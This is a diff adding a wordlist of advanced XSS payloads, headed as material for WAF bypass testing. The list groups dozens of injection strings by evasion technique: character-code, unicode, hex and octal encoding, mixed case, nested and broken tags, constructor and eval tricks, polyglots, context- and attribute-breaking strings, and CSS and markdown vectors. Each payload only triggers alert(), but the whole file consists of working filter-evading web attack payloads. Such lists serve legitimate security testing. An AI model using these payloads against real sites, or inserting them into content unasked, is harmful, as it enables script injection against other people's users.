@@ -1,0 +1,125 @@
+# XSS Injection Vectors - Advanced
+# Advanced and obfuscated XSS payloads for WAF bypass testing
+
+# Encoded XSS
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+
+# Unicode XSS
+<script>\u0061lert('XSS')</script>
+<script>\u0061\u006c\u0065\u0072\u0074('XSS')</script>
+<img src=x onerror=\u0061lert('XSS')>
+
+# Hex Encoded XSS
+<script>eval('\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29')</script>
+<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x31\x29')>
+
+# Octal Encoded XSS
+<script>eval('\141\154\145\162\164\50\61\51')</script>
+
+# Mixed Case XSS
+<ScRiPt>alert('XSS')</sCrIpT>
+<IMG SRC=x OnErRoR=alert('XSS')>
+<SvG OnLoAd=alert('XSS')>
+
+# Null Byte XSS
+<script>alert('XSS')%00</script>
+<img src=x%00 onerror=alert('XSS')>
+
+# Comment Breaking XSS
+<!--><script>alert('XSS')</script>-->
+<!--><img src=x onerror=alert('XSS')>-->
+
+# Nested XSS
+<script><script>alert('XSS')</script></script>
+<img src=<img src=x onerror=alert('XSS')>>
+
+# Filter Bypass XSS
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
+<img src=x onerror=a\u006cert('XSS')>
+<svg/onload=alert`XSS`>
+<svg/onload=alert&lpar;'XSS'&rpar;>
+
+# Whitespace XSS
+<img	src=x	onerror=alert('XSS')>
+<svg/onload=alert('XSS')>
+<script>alert('XSS')</script>
+
+# Newline XSS
+<img
+src=x
+onerror=alert('XSS')>
+<script>
+alert('XSS')
+</script>
+
+# Tab XSS
+<img	src=x	onerror=alert('XSS')>
+
+# Quote Bypass XSS
+<img src=x onerror=alert("XSS")>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert`XSS`>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+
+# Parenthesis Bypass XSS
+<svg/onload=alert`1`>
+<svg/onload=alert&lpar;1&rpar;>
+<svg/onload=alert&#40;1&#41;>
+
+# Slash Bypass XSS
+<svg/onload=alert(1)>
+<svg//onload=alert(1)>
+<svg///onload=alert(1)>
+
+# Backtick XSS
+<img src=x onerror=alert`XSS`>
+<svg onload=alert`XSS`>
+
+# Template Literal XSS
+<script>alert`XSS`</script>
+<img src=x onerror=alert`${1}`>
+
+# Arrow Function XSS
+<img src=x onerror=_=>alert(1)>
+<svg onload=_=>alert(1)>
+
+# Eval XSS
+<img src=x onerror=eval('alert(1)')>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+
+# Constructor XSS
+<img src=x onerror=this['constructor']['constructor']('alert(1)')()>
+<img src=x onerror=[]['constructor']['constructor']('alert(1)')()>
+
+# DOM XSS
+<img src=x onerror=document.write('<script>alert(1)</script>')>
+<img src=x onerror=document.body.innerHTML='<img src=x onerror=alert(1)>'>
+
+# Polyglot XSS
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
+
+# Context Breaking XSS
+';alert('XSS');//
+";alert('XSS');//
+</script><script>alert('XSS')</script>
+</style><script>alert('XSS')</script>
+</title><script>alert('XSS')</script>
+
+# Attribute Breaking XSS
+" onload=alert('XSS') x="
+' onload=alert('XSS') x='
+> <script>alert('XSS')</script>
+
+# CSS XSS
+<style>*{background:url('javascript:alert(1)')}</style>
+<link rel=stylesheet href=data:,*%7bbackground:url('javascript:alert(1)')%7d>
+
+# XML XSS
+<![CDATA[<script>alert('XSS')</script>]]>
+
+# Markdown XSS
+[XSS](javascript:alert('XSS'))
+![XSS](javascript:alert('XSS'))
